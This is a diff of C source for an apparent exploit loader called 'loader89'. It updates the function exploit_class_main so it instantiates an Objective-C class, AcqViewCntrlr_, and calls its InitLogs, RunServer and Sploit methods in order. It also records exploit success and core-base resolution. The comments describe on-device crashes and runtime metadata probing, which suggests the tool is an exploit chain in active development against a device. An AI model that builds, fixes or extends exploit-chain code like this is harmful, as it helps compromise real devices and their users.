@@ -581,15 +581,26 @@ static int read_child_status(void) {
 
 static int exploit_class_main(void *acqCls, void *core) {
     if (!acqCls) return 2;
+    /* v5.9 fix: ObjC metadata probe (v59_meta_probe.py) proved all 36 methods
+     * of AcqViewCntrlr_ are INSTANCE methods and the metaclass method list is
+     * empty (baseMethods=0). Calling +[AcqViewCntrlr_ Sploit] crashed with
+     * NSInvalidArgumentException on device. Correct chain per IMP order:
+     * alloc/init -> InitLogs(0x42a0) -> RunServer(0x4688) -> Sploit(0x4694).
+     * All three take no arguments (v16@0:8). */
+    void *inst = p_msgSend(p_msgSend(acqCls, p_sel("alloc")), p_sel("init"));
+    if (!inst) { log_error("AcqViewCntrlr_ alloc/init returned nil"); return 3; }
+    log_info("InitLogs before");
+    p_msgSend(inst, p_sel("InitLogs"));
+    log_info("InitLogs after");
+    log_info("RunServer before");
+    p_msgSend(inst, p_sel("RunServer"));
+    g_exploit_sts.runserver_done = 1;
+    g_exploit_sts.succeeded |= exploit_core_ok(core, &g_exploit_sts.raw_flag, &g_exploit_sts.core_base_resolved);
+    log_info("RunServer after");
     log_info("Sploit before");
-    p_msgSend(acqCls, p_sel("Sploit"));
+    p_msgSend(inst, p_sel("Sploit"));
     log_info("Sploit after");
     g_exploit_sts.sploit_done = 1;
-    g_exploit_sts.succeeded |= exploit_core_ok(core, &g_exploit_sts.raw_flag, &g_exploit_sts.core_base_resolved);
-    log_info("RunServer before");
-    p_msgSend(acqCls, p_sel("RunServer"));
-    log_info("RunServer after");
-    g_exploit_sts.runserver_done = 1;
     g_exploit_sts.succeeded |= exploit_core_ok(core, &g_exploit_sts.raw_flag, &g_exploit_sts.core_base_resolved);
     int ok = g_exploit_sts.succeeded;
     char msg[220];
@@ -997,7 +1008,7 @@ static void *worker(void *arg) {
         log_info(dm);
     }
 
-    log_info("=== loader89 v5.8 status-file-and-policy start ===");
+    log_info("=== loader89 v5.9 instance-method-chain start ===");
     read_runtime_config();
     {
         /* v5.8 problem C: child/worker exploit state goes to this file;
